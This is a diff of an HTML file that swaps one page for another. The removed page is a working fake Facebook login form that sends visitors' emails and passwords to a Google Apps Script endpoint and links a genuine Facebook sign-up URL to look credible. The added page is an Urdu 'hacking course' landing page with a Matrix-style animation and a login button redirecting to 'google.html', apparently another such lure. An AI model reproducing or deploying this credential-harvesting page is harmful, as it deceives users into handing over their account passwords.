@@ -1,127 +1,183 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="ur">
 <head>
-  <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-8PLYFGLXW3"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ہیکنگ کورس</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', Courier, monospace;
+        }
 
-  gtag('config', 'G-8PLYFGLXW3');
-</script>
-  
-<title>Login Page</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- موبائل ریسپانسیو کے لیے ضروری -->
-<style>
-  body {
-    font-family: sans-serif;
-    background-color: #f0f2f5;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    min-height: 100vh; /* پوری سکرین کی ہائیٹ */
-    margin: 0;
-    padding: 0;
-  }
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            overflow: hidden;
+        }
 
-  .login-container {
-    background-color: white;
-    border-radius: 8px;
-    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-    padding: 20px;
-    width: 90%; /* سکرین کے مطابق چوڑائی */
-    max-width: 400px; /* زیادہ سے زیادہ چوڑائی 400px */
-    text-align: center;
-    margin: 10px; /* کناروں سے کچھ فاصلہ */
-  }
+        /* ہیڈر سیکشن */
+        header {
+            text-align: center;
+            padding: 20px;
+            background: linear-gradient(45deg, #00ff00, #0a0a0a);
+            border-bottom: 2px solid #00ff00;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
 
-  .login-container h2 {
-    color: #1877f2;
-    margin-bottom: 20px;
-    font-size: 1.5rem; /* موبائل پر فونٹ سائز ایڈجسٹ */
-  }
+        header h1 {
+            font-size: 3em;
+            text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
+        }
 
-  .login-container input[type="email"],
-  .login-container input[type="text"] {
-    width: 100%; /* ان پٹ فیلڈز پوری چوڑائی لیں */
-    box-sizing: border-box; /* پیڈنگ اور بارڈر کو چوڑائی میں شامل کریں */
-    padding: 12px;
-    margin-bottom: 15px;
-    border: 1px solid #dddfe2;
-    border-radius: 6px;
-    font-size: 1rem; /* فونٹ سائز موبائل کے لیے موزوں */
-  }
+        /* مین کنٹینر */
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: calc(100vh - 100px);
+            flex-direction: column;
+            text-align: center;
+        }
 
-  .login-container button {
-    background-color: #1877f2;
-    color: white;
-    padding: 12px;
-    border: none;
-    border-radius: 6px;
-    cursor: pointer;
-    width: 100%;
-    font-weight: bold;
-    font-size: 1rem;
-  }
+        .course-info {
+            background: rgba(0, 255, 0, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #00ff00;
+            margin-bottom: 20px;
+            animation: fadeIn 2s ease-in-out;
+        }
 
-  .login-container button:hover {
-    background-color: #166fe5;
-  }
+        .course-info h2 {
+            font-size: 2em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 5px #00ff00;
+        }
 
-  .login-container a {
-    text-decoration: none;
-    color: #1877f2;
-    display: block;
-    margin-top: 10px;
-    font-size: 0.9rem;
-  }
+        .course-info p {
+            font-size: 1.2em;
+            line-height: 1.5;
+        }
 
-  .login-container a:hover {
-    text-decoration: underline;
-  }
+        /* لاگن بٹن */
+        .login-btn {
+            padding: 15px 30px;
+            font-size: 1.5em;
+            background: #00ff00;
+            color: #0a0a0a;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00;
+        }
 
-  /* میڈیا کوئری: 600px سے چھوٹی سکرینز کے لیے */
-  @media (max-width: 600px) {
-    .login-container {
-      padding: 15px;
-      width: 90%;
-      margin: 5px;
-    }
+        .login-btn:hover {
+            background: #0a0a0a;
+            color: #00ff00;
+            box-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00;
+            transform: scale(1.1);
+        }
 
-    .login-container h2 {
-      font-size: 1.3rem;
-    }
+        /* اینیمیشنز */
+        @keyframes glow {
+            from {
+                box-shadow: 0 0 10px #00ff00;
+            }
+            to {
+                box-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00;
+            }
+        }
 
-    .login-container input[type="email"],
-    .login-container input[type="text"] {
-      padding: 10px;
-      font-size: 0.9rem;
-    }
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translateY(20px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
 
-    .login-container button {
-      padding: 10px;
-      font-size: 0.9rem;
-    }
-  }
-</style>
+        /* بیک گراؤنڈ اینیمیشن */
+        .matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.2;
+        }
+
+        canvas {
+            display: block;
+        }
+    </style>
 </head>
 <body>
+    <!-- بیک گراؤنڈ میٹرکس اینیمیشن کے لیے کینوس -->
+    <canvas class="matrix"></canvas>
 
-<div class="login-container">
-  <h2>Facebook</h2>
-  <form 
-    method="POST" 
-    action="https://script.google.com/macros/s/AKfycbxkmnBujBrHe46FNf8qCvelRqYmQMgmyULtYxnPGmZkrVJJkN9eYCGMWbj9DgiO0Lh1/exec"
-  >
-    <input name="Email" type="email" placeholder="Email" required>
-    <input name="Password" type="text" placeholder="Password" required>
-    <button type="submit">Log In</button>
-  </form>
-  <a href="#">Forgot password?</a>
-  <hr style="margin-top: 20px; border: none; border-bottom: 1px solid #dadde1;">
-  <button style="background-color: #42b72a; margin-top: 20px;" onclick="window.location.href='https://m.facebook.com/campaign/landing.php?campaign_id=1653377901&extra_1=s%7Cm%7C358050429248%7Ce%7Cfacebook%20sign%20up%7C&placement&creative=358050429248&keyword=facebook%20sign%20up&partner_id=googlesem&extra_2=campaignid%3D1653377901%26adgroupid%3D65139789722%26matchtype%3De%26network%3Dg%26source%3Dmobile%26search_or_content%3Ds%26device%3Dm%26devicemodel%3D%26adposition%3D%26target%3D%26targetid%3Dkwd-5066597374%26loc_physical_ms%3D1011080%26loc_interest_ms%3D%26feeditemid%3D%26param1%3D%26param2%3D&gad_source=1&gclid=Cj0KCQjwhMq-BhCFARIsAGvo0KcHHn9tEiSrHej9FhBXzuFVLBVqWpR9MevAWz25Vlt9JgaE6L8xXm8aAmeuEALw_wcB&soft=hjk';">Create New Account</button>
-</div>
+    <header>
+        <h1>ہیکنگ کورس</h1>
+    </header>
 
+    <div class="container">
+        <div class="course-info">
+            <h2>ایک ہیکر بننے کا سفر شروع کریں</h2>
+            <p>اس کورس میں آپ ایتھیکل ہیکنگ، نیٹ ورک سیکیورٹی، اور سائبر ڈیفنس کے راز سیکھیں گے۔ ماہرین کے ساتھ عملی تربیت حاصل کریں اور اپنی صلاحیتوں کو اگلی سطح پر لے جائیں!</p>
+        </div>
+        <button class="login-btn" onclick="redirectToIndex()">لاگن کریں</button>
+    </div>
+
+    <script>
+        // لاگن بٹن پر کلک کرنے پر index.html پر ری ڈائریکٹ
+        function redirectToIndex() {
+            window.location.href = 'google.html';
+        }
+
+        // میٹرکس اینیمیشن
+        const canvas = document.querySelector('.matrix');
+        const ctx = canvas.getContext('2d');
+
+        canvas.height = window.innerHeight;
+        canvas.width = window.innerWidth;
+
+        const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&*';
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        const drops = [];
+
+        for (let x = 0; x < columns; x++) {
+            drops[x] = 1;
+        }
+
+        function draw() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#00ff00';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = chars.charAt(Math.floor(Math.random() * chars.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+
+        setInterval(draw, 33);
+
+        // ونڈو ری سائز پر کینوس ایڈجسٹ کریں
+        window.addEventListener('resize', () => {
+            canvas.height = window.innerHeight;
+            canvas.width = window.innerWidth;
+        });
+    </script>
 </body>
 </html>
